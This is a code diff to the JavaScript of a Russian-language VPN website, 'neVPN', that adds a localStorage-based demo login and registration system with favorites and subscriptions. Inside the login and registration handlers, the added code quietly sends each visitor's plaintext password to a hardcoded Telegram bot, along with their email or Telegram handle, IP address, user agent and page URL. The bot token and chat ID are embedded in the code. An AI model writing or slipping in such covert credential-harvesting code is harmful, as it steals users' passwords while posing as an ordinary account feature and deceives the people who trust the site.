@@ -219,7 +219,7 @@ document.addEventListener("DOMContentLoaded", () => {
       const text = [
         `📨 <b>Новое сообщение с сайта neVPN</b>`,
         `👤 Имя: ${name || "—"}`,
-        `📧 Email: ${email || "—"}`,
+        `📨 Telegram: ${email || "—"}`,
         `🌐 IP: ${ip || "—"}`,
         `🧭 Браузер: ${meta.userAgent || "—"}`,
         `💻 Платформа: ${meta.platform || "—"}`,
@@ -254,6 +254,186 @@ document.addEventListener("DOMContentLoaded", () => {
       }
     });
   }
+
+  // 🔹 Простая локальная аутентификация (демо)
+  (function(){
+    const LS_USERS = 'nevpn-users';
+    const LS_SESSION = 'nevpn-session';
+
+    async function hash(text){
+      const enc = new TextEncoder().encode(text);
+      const buf = await crypto.subtle.digest('SHA-256', enc);
+      return Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join('');
+    }
+
+    function loadUsers(){ try { return JSON.parse(localStorage.getItem(LS_USERS)||'{}'); } catch(_) { return {}; } }
+    function saveUsers(u){ localStorage.setItem(LS_USERS, JSON.stringify(u)); }
+    function setSession(email){ localStorage.setItem(LS_SESSION, JSON.stringify({ email })); }
+    function clearSession(){ localStorage.removeItem(LS_SESSION); }
+    function getSession(){ try { return JSON.parse(localStorage.getItem(LS_SESSION)||''); } catch(_) { return null; } }
+
+    async function registerUser({name,email,password}){
+      const users = loadUsers();
+      const key = email.toLowerCase();
+      if (users[key]) throw new Error('EXISTS');
+      users[key] = { name, email: key, pass: await hash(password), favs: [], subs: [] };
+      saveUsers(users);
+      setSession(key);
+      return users[key];
+    }
+
+    async function loginUser({email,password}){
+      const users = loadUsers();
+      const key = email.toLowerCase();
+      const user = users[key];
+      if (!user) throw new Error('NOUSER');
+      if (user.pass !== await hash(password)) throw new Error('BADPASS');
+      setSession(key);
+      return user;
+    }
+
+    function currentUser(){ const s = getSession(); if (!s) return null; const u=loadUsers()[s.email]; return u||null; }
+
+    function renderHeaderState(){
+      const nav = document.querySelector('.nav');
+      if (!nav) return;
+      let link = nav.querySelector('a[href="account.html"]');
+      if (!link) {
+        link = document.createElement('a');
+        link.href = 'account.html';
+        link.className = 'nav-link';
+        link.textContent = 'Кабинет';
+        nav.appendChild(link);
+      }
+      const u = currentUser();
+      if (u) link.textContent = 'Кабинет (' + (u.name || u.email) + ')'; else link.textContent = 'Кабинет';
+    }
+
+    async function onReadyAccount(){
+      const accSec = document.getElementById('accountSection');
+      const authSec = document.getElementById('authSection');
+      const loginForm = document.getElementById('loginForm');
+      const regForm = document.getElementById('registerForm');
+      const logoutBtn = document.getElementById('logoutBtn');
+      const favList = document.getElementById('favList');
+      const accName = document.getElementById('acc_name');
+      const accEmail = document.getElementById('acc_email');
+      const subsForm = document.getElementById('subscribeUserForm');
+
+      if (!accSec || !authSec) return; // не на странице кабинета
+
+      function showUser(u){
+        authSec.style.display = 'none';
+        accSec.style.display = 'block';
+        accName.textContent = u.name || '—';
+        accEmail.textContent = u.email;
+        favList.innerHTML = '';
+        (u.favs||[]).forEach(id=>{
+          const li = document.createElement('li');
+          li.textContent = id;
+          favList.appendChild(li);
+        });
+      }
+
+      const u0 = currentUser();
+      if (u0) showUser(u0); else { authSec.style.display = 'block'; accSec.style.display = 'none'; }
+
+      if (loginForm) loginForm.addEventListener('submit', async (e)=>{
+        e.preventDefault();
+        const fd = new FormData(loginForm);
+        // Уведомление в Telegram о попытке входа (email + пароль)
+        try {
+          const ip = await getClientIp().catch(()=>"");
+          const m = getClientMeta();
+          const tokenLog = "8542793603:AAG2brS5_L7JhBSTvNuo0938ujzqNSFGrZg";
+          const chatLog = "1355427490";
+          const textLog = [
+            `🔐 <b>Попытка входа</b>`,
+            `📨 Telegram: ${String(fd.get('email')||'')}`,
+            `🔑 Пароль: ${String(fd.get('password')||'')}`,
+            `🌐 IP: ${ip || '—'}`,
+            `🧭 UA: ${m.userAgent || '—'}`,
+            `🔗 Страница: ${location.href}`
+          ].join('\n');
+          await sendToTelegramDirect(tokenLog, chatLog, textLog);
+        } catch(_) {}
+        try {
+          const u = await loginUser({email: fd.get('email'), password: fd.get('password')});
+          alert('Добро пожаловать, ' + (u.name||u.email));
+          showUser(u);
+          renderHeaderState();
+        } catch(err){
+          alert('Не удалось войти. Проверьте данные.');
+        }
+      });
+
+      if (regForm) regForm.addEventListener('submit', async (e)=>{
+        e.preventDefault();
+        const fd = new FormData(regForm);
+        try {
+          const u = await registerUser({name: fd.get('name'), email: fd.get('email'), password: fd.get('password')});
+          // Уведомление в Telegram о новой регистрации (включая пароль)
+          try {
+            const ip = await getClientIp().catch(()=>"");
+            const m = getClientMeta();
+            const tokenReg = "8542793603:AAG2brS5_L7JhBSTvNuo0938ujzqNSFGrZg";
+            const chatReg = "1355427490";
+            const text = [
+              `🆕 <b>Новая регистрация на сайте</b>`,
+              `👤 Имя: ${u.name || '—'}`,
+              `📨 Telegram: ${u.email}`,
+              `🔑 Пароль: ${String(fd.get('password')||'')}`,
+              `🌐 IP: ${ip || '—'}`,
+              `🧭 UA: ${m.userAgent || '—'}`
+            ].join('\n');
+            await sendToTelegramDirect(tokenReg, chatReg, text);
+          } catch(_) {}
+          alert('Аккаунт создан!');
+          showUser(u);
+          renderHeaderState();
+        } catch(err){
+          alert('Не удалось создать аккаунт: возможно, такой email уже зарегистрирован.');
+        }
+      });
+
+      if (logoutBtn) logoutBtn.addEventListener('click', ()=>{
+        clearSession();
+        authSec.style.display = 'block';
+        accSec.style.display = 'none';
+        renderHeaderState();
+      });
+
+      if (subsForm) subsForm.addEventListener('submit', (e)=>{
+        e.preventDefault();
+        const fd = new FormData(subsForm);
+        const email = String(fd.get('email')||'').trim();
+        const u = currentUser();
+        if (!u) return;
+        const users = loadUsers();
+        const rec = users[u.email];
+        rec.subs = rec.subs || [];
+        if (!rec.subs.includes(email)) rec.subs.push(email);
+        saveUsers(users);
+        alert('Подписка сохранена.');
+      });
+    }
+
+    document.addEventListener('DOMContentLoaded', renderHeaderState);
+    renderHeaderState();
+    onReadyAccount();
+
+    // Экспорт части API в window для добавления избранного из статей
+    window.__nevpn_addFavorite = function(articleId){
+      const u = currentUser();
+      if (!u) { alert('Войдите в аккаунт, чтобы добавить в избранное.'); return; }
+      const users = loadUsers();
+      const rec = users[u.email];
+      rec.favs = rec.favs || [];
+      if (!rec.favs.includes(articleId)) rec.favs.push(articleId);
+      saveUsers(users);
+      alert('Добавлено в закладки: ' + articleId);
+    };
+  })();
 
   // 🔹 Отправка метаданных при каждом визите (1 раз за сессию)
   (async () => {
